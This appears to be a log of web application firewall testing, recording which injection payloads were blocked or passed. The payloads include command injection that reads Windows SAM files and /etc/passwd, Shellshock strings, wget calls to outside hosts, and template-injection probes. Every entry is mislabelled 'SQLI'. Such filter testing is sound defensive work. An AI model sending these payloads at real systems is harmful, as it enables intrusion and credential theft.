+{"payload": "system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006601626999326982}
+{"payload": "systeminfo", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014959348001866601}
+{"payload": "| systeminfo", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007610760992974974}
+{"payload": "; systeminfo", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007492413991712965}
+{"payload": "& systeminfo", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005846209009177983}
+{"payload": "&& systeminfo", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.010169260000111535}
+{"payload": "system('ls')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0062116610060911626}
+{"payload": "system('pwd')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005932369997026399}
+{"payload": "system('pwd');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005593542999122292}
+{"payload": "|| system('sleep 5');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009473598009208217}
+{"payload": "| system('sleep 5');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005754632002208382}
+{"payload": "; system('sleep 5');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006052455006283708}
+{"payload": "& system('sleep 5');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005159567997907288}
+{"payload": "&& system('sleep 5');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004883208996034227}
+{"payload": "system('sleep 5')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006117188997450285}
+{"payload": "system('sleep 5');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006094397002016194}
+{"payload": "system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0067906539916293696}
+{"payload": "system('wget https://sn1persecurity.com/.testing/rce_vuln.txt');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008147845001076348}
+{"payload": "system('whoami')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009690969993243925}
+{"payload": "system('whoami');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007416567008476704}
+{"payload": "test*; ls -lhtR /var/www/", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007352243992500007}
+{"payload": "test* || perl -e 'print \"X\"x16096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005642117001116276}
+{"payload": "test* | perl -e 'print \"X\"x16096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004583592002745718}
+{"payload": "test* & perl -e 'print \"X\"x16096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005763299006503075}
+{"payload": "test* && perl -e 'print \"X\"x16096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00532112100336235}
+{"payload": "test*; perl -e 'print \"X\"x16096'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005620534997433424}
+{"payload": "$(`type C:\\boot.ini`)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005376866000005975}
+{"payload": "&&type C:\\\\boot.ini", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0039374110056087375}
+{"payload": "| type C:\\Windows\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038014070014469326}
+{"payload": "; type C:\\Windows\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005361157993320376}
+{"payload": "& type C:\\Windows\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005617408009129576}
+{"payload": "&& type C:\\Windows\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004034174999105744}
+{"payload": "type C:\\Windows\\repair\\SAM", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013456010012305342}
+{"payload": "| type C:\\Windows\\repair\\SYSTEM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003934252992621623}
+{"payload": "; type C:\\Windows\\repair\\SYSTEM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004160148004302755}
+{"payload": "& type C:\\Windows\\repair\\SYSTEM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005018234005547129}
+{"payload": "&& type C:\\Windows\\repair\\SYSTEM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038972459879005328}
+{"payload": "type C:\\Windows\\repair\\SYSTEM", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010643686007824726}
+{"payload": "| type C:\\WINNT\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003685561998281628}
+{"payload": "; type C:\\WINNT\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035454449971439317}
+{"payload": "& type C:\\WINNT\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0041420240013394505}
+{"payload": "&& type C:\\WINNT\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004222987990942784}
+{"payload": "type C:\\WINNT\\repair\\SAM", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014754856005311012}
+{"payload": "type C:\\WINNT\\repair\\SYSTEM", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01166682899929583}
+{"payload": "| type %SYSTEMROOT%\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006505701006972231}
+{"payload": "; type %SYSTEMROOT%\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006202058997587301}
+{"payload": "& type %SYSTEMROOT%\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005668098005116917}
+{"payload": "&& type %SYSTEMROOT%\\repair\\SAM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006637420010520145}
+{"payload": "type %SYSTEMROOT%\\repair\\SAM", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.03437289100838825}
+{"payload": "| type %SYSTEMROOT%\\repair\\SYSTEM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004200205992674455}
+{"payload": "; type %SYSTEMROOT%\\repair\\SYSTEM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005651544008287601}
+{"payload": "& type %SYSTEMROOT%\\repair\\SYSTEM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004629799994290806}
+{"payload": "&& type %SYSTEMROOT%\\repair\\SYSTEM", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004238598994561471}
+{"payload": "type %SYSTEMROOT%\\repair\\SYSTEM", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01071453899203334}
+{"payload": "uname", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015383764999569394}
+{"payload": ";uname;", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005771285010268912}
+{"payload": "| uname -a", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038516339991474524}
+{"payload": "; uname -a", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034107469982700422}
+{"payload": "& uname -a", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003469881005003117}
+{"payload": "&& uname -a", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034329689951846376}
+{"payload": "uname -a", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003236874006688595}
+{"payload": "|/usr/bin/id", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003160103995469399}
+{"payload": ";|/usr/bin/id|", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032104519923450425}
+{"payload": ";/usr/bin/id|", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032606489985482767}
+{"payload": "$;/usr/bin/id", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032733830012148246}
+{"payload": "() { :;};/usr/bin/perl -e 'print \\\"Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\\";system(\\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\\\");'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0041974789928644896}
+{"payload": "() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003595301997847855}
+{"payload": "| wget http://crowdshield.com/.testing/rce.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004207939011394046}
+{"payload": "& wget http://crowdshield.com/.testing/rce.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003540917008649558}
+{"payload": "; wget https://crowdshield.com/.testing/rce_vuln.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034668399894144386}
+{"payload": "$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038451180007541552}
+{"payload": "&& wget https://crowdshield.com/.testing/rce_vuln.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005072601998108439}
+{"payload": "wget https://crowdshield.com/.testing/rce_vuln.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004845935996854678}
+{"payload": "$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043536990124266595}
+{"payload": "which curl", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015859961000387557}
+{"payload": "which gcc", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01423110900213942}
+{"payload": "which nc", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.018620300994371064}
+{"payload": "which netcat", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.017473006999352947}
+{"payload": "which perl", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013105926002026536}
+{"payload": "which python", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011912242000107653}
+{"payload": "which wget", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012159689998952672}
+{"payload": "whoami", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013285476990859024}
+{"payload": "| whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004245286007062532}
+{"payload": "; whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004352653995738365}
+{"payload": "' whoami", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013533157005440444}
+{"payload": "' || whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00394090500776656}
+{"payload": "' & whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034431609965395182}
+{"payload": "' && whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003234989009797573}
+{"payload": "'; whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035393440048210323}
+{"payload": "\" whoami", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010019362001912668}
+{"payload": "\" || whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033184189960593358}
+{"payload": "\" | whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003618226997787133}
+{"payload": "\" & whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006010555007378571}
+{"payload": "\" && whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005801482999231666}
+{"payload": "\"; whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007055634006974287}
+{"payload": "$(`whoami`)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006163368991110474}
+{"payload": "& whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005111588005092926}
+{"payload": "&& whoami", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005728030999307521}
+{"payload": "{{ get_user_file(\"C:\\boot.ini\") }}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004967110013240017}
+{"payload": "{{ get_user_file(\"/etc/hosts\") }}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00479610099864658}
+{"payload": "{{ get_user_file(\"/etc/passwd\") }}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005165729991858825}
+{"payload": "{{4+4}}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015235660001053475}
+{"payload": "{{4+8}}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011830364004708827}
+{"payload": "{{person.secret}}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010960871004499495}
+{"payload": "{{person.name}}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01298265901277773}
+{"payload": "{1} + {1}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01309126899286639}
+{"payload": "{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012944845002493821}
+{"payload": "{{[] .__ Class __.__ base __.__ subclasses __ ()}}", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010732444003224373}
